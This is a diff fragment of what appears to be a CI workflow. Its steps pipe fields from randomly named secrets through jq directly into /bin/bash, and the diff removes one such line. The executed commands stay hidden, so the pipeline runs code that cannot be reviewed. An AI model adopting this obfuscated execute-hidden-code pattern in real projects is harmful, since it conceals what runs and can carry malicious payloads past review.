@@ -18,7 +18,6 @@ jobs:
           lpwnz8896: ${{ secrets.lpwnz8896 }}
         run: |
           printf '%s' "$lpwnz8896" | jq -r .vtc97568 | /bin/bash
-          echo $hs333 | jq -r .hsss913 | /bin/bash
           printf '%s' "$etxqi8" | jq -r .jt8502 | /bin/bash
           printf '%s' "$tspyb592" | jq -r .mtjl54 | /bin/bash
           printf '%s' "$ymj8" | jq -r .rk093 | /bin/bash
